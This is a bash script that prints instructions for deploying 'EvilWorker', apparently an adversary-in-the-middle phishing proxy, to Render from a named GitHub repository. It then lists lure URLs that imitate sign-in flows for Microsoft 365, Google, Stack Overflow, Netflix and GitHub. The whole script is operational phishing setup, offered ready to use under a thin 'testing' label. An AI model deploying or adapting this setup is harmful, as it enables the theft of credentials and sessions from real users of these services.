#!/bin/bash

# Original EvilWorker Deployment Script
# This script deploys the exact original EvilWorker implementation to Render

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

echo "🚀 Original EvilWorker Deployment Script"
echo "========================================"
echo

print_status "This script will deploy the exact original EvilWorker implementation"
print_status "Repository: https://github.com/Billoxinogen18/evilworker-original-google.git"
print_status "Service Name: evilworker-original-google"
echo

print_warning "Please create a new Render service manually:"
echo "1. Go to https://dashboard.render.com"
echo "2. Click 'New +' → 'Web Service'"
echo "3. Connect GitHub repository: Billoxinogen18/evilworker-original-google"
echo "4. Use these settings:"
echo "   - Name: evilworker-original-google"
echo "   - Branch: main"
echo "   - Build Command: npm install"
echo "   - Start Command: node proxy_server.js"
echo "   - Health Check Path: /"
echo "   - Plan: Free"
echo

print_status "After creating the service, you can test with these URLs:"
echo "📧 Microsoft Office 365:"
echo "   https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"
echo
echo "🔍 Google Accounts:"
echo "   https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2F"
echo
echo "🌐 Stack Overflow:"
echo "   https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fstackoverflow.com%2F"
echo
echo "🎬 Netflix:"
echo "   https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fwww.netflix.com%2F"
echo
echo "💻 GitHub:"
echo "   https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fgithub.com%2F"
echo

print_success "Original EvilWorker is ready for deployment!"
print_status "This is the exact implementation from the author's repository"
print_status "No modifications - pure original code for testing Google compatibility"
